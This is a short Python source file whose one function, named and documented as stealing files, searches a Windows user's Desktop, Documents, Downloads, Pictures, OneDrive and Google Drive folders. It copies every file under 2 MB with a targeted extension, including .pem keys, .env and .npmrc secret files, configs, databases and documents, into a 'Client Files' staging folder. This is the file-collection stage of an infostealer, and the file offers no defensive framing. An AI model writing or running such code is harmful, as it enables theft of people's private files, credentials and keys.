import os
import shutil
from pathlib import Path
from getpass import getuser


def steal_desktop_txt_file(kingFolder: str) -> None:
    """this function steall files"""
    FILE_EXTANTANTION: str = [
        ".pdf",
        ".txt", 
        ".sql", 
        ".json", 
        ".docx", 
        ".pem", 
        ".conf", 
        ".env", 
        ".npmrc", 
        ".csv"
    ]

    paths: dict[str, str] = {
        "Desktop": os.path.join(os.getenv("USERPROFILE"), "Desktop"),
        "Documents": os.path.join(os.getenv("USERPROFILE"), "Documents"),
        "Downloads": os.path.join(os.getenv("USERPROFILE"), "Downloads"),
        "Pictures": os.path.join(os.getenv("USERPROFILE"), "Pictures"),
        "OneDrive Documents": os.path.join(os.getenv("USERPROFILE"), "OneDrive", "Documents"),
        "OneDrive Desktop": os.path.join(os.getenv("USERPROFILE"), "OneDrive", "Desktop"),
        "Google Drive": os.path.join(os.getenv("USERPROFILE"), "Google Drive"),
    }

    folder_path: str = os.path.join(kingFolder, "Client Files")
    for names_dir, path_dir in paths.items():
        if not os.path.exists(path_dir):
            continue
        for file_name in os.listdir(path_dir):
            for extantion in FILE_EXTANTANTION:
                all_file_path: str = os.path.join(path_dir, file_name)
                if not os.path.isfile(all_file_path):
                    continue
                if Path(all_file_path).suffix.lower() == extantion and os.path.getsize(all_file_path) <= 2*1024*1024:
                    os.makedirs(os.path.join(folder_path, names_dir, extantion), exist_ok=True)
                    try:
                        shutil.copy2(all_file_path, os.path.join(folder_path, names_dir, extantion, file_name))
                    except Exception as err:
                        print(err) 